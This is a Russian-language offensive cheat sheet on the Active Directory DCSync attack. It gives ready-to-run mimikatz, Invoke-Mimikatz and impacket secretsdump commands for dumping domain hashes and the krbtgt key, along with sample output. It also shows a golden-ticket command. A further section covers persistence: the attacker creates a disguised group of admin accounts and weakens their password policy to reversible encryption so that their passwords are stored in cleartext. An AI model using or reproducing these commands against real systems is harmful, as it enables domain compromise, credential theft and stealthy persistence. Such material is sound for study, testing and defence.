# DCSync

## About

Для атаки **DCSync** необходимы специальные права. Любой член групп «Администраторы» и «Администраторы домена», а также учетных записей компьютеров контроллера домена может выполнить репликацию данных, используя протокол репликации каталогов DRS. Таким образом клиентский DC отправляет запрос DSGetNCChanges на сервер, когда хочет получать от него обновления объектов AD. Ответ содержит набор обновлений, которые клиент должен применить к своей реплике NC.

Можно выполнить DCSync с использованием обычной учетной записи пользователя. Но для этого одно из следующих правил должно быть делегировано на уровне домена, чтобы учетная запись пользователя могла беспрепятственно получать данные с помощью DCSync:

1. DS-Replication-Get-Changes — это разрешение необходимо для репликации только тех изменений, которые также реплицированы в глобальный каталог.
2. DS-Replication-Get-Changes-All — разрешение позволяет репликацию всех данных.

## Tools

Для получения ключей аккаунта krbtgt, лезем в базу домена (локально или удаленно).

### Mimikatz lsadump::dcsync

Члены групп «Администраторы» и «Контроллер домена» по умолчанию имеют эти права. После того как учетной записи делегирована возможность репликации объектов, учетная запись может использовать mimikatz DCSync:

```
mimikatz# lsadump::dcsync /domain:[домен] /user:[пользователь]
```

Также при реализации данной атаки можно получить историю паролей учетной записи, точнее NTLM-хеши. Взлом этих хешей позволит понять логику выставления паролей, что, возможно, поможет угадать следующий пароль в случае замены.

### Invoke-Mimikatz

Запуск mimikatz на DC

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername my-dc
```

Запуск mimikatz на любой тачке

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:my.domain.local /sid:S-1-5-21-3280384115-3177337293-604213748 /krbtgt:2adf794a4f1ba75fa56fb5b2f6393bc3 /id:501 /groups:504 /ptt"'
```

Использование DCSync фичи для получения krbtgt хеша, можно использовать вот эту команду с привилегиями Domain Admin для домена mydomain:

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:mydomain\krbtgt"'
```

### Impacket secretsdump.py

Выполнить DCSync можно также с помощью imрacket удаленно, для чего нужны учетные данные.

```
$ secretsdump.py tdomain.dom/root:Secret08@192.168.226.137
или
$ secretsdump.py tdomain.dom/root:Secret08@192.168.226.137 -just-dc >> out.im
или 
$ secretsdump.py DOMAIN/user@<IP> -hashes bb..b56:bb..b56
или
$ secretsdump.py 'contoso.local/Administrator@192.168.100.2' -just-dc-user krbtgt
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fe8b03404a4975e7226caf6162cfccba:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
krbtgt:aes128-cts-hmac-sha1-96:a268f61e103134bb7e975a146ed1f506
krbtgt:des-cbc-md5:0e6d79d66b4951cd
[*] Cleaning up...
```

## Получение открытого пароля с помощью DCSync

Но что делать, если хеш пароля не взламывается?

Выход есть! Для учетных записей Active Directory существует устаревшая функция, которая называется «обратимое шифрование». Если включено обратимое шифрование, то зашифрованные данные могут быть возвращены обратно к паролю пользователя.

Если для учетной записи включено обратимое шифрование и пользователь меняет пароль после установки этой конфигурации, пароль в виде открытого текста сохраняется в базе данных Active Directory.

Оператор может создать новую группу ShareRoint и добавить все учетные записи домена с атрибутом AdminCount, установленным в 1.

```
PS > New-ADGroup -Name ShareRoint -SamAccountName ShareRoint -GroupCategory Security -GroupScope Global -DisplayName ShareRoint -Path "CN=Users,DC=tdomain,DC=dom"
PS > $Admins = Get-ADUser -filter { AdminCount -eq 1 }
PS > Add-ADGroupMember ShareRoint -Members $Admins
```

Теперь нужно создать новую парольную политику.

```
PS C:\Windows\system32> New-ADFineGrainedPasswordPolicy -Name ShareRoint -DisplayName ShareRoint -Precedence 1 -ComplexityEnabled $false -ReversibleEncryptionEnabled $true -PasswordHistoryCount 0 -MinPasswordLength 0 -MinPasswordAge 0.00:00:00 -MaxPasswordAge 0.00:00:00 -LockoutThreshold 0 -LockoutObservationWindow 0.00:00:00 -LockoutDuration 0.00:00:00
```

Проверим, что атрибут ReversibleEncryptionEnabled установлен в True.

```
PS C:\Windows\system32> Get-ADFineGrainedPasswordPolicy ShareRoint
```

Теперь стоить применить парольную политику к новой группе.

```
Add-ADFineGrainedPasswordPolicySubject -Identity ShareRoint -Subjects ShareRoint
```

Проверить, применилась ли парольная политика, очень легко.

Новая парольная политика обнуляет все стандартные параметры безопасности паролей домена. После смены пароля, которую инициирует оператор, все пароли администраторов будут храниться в открытом виде.

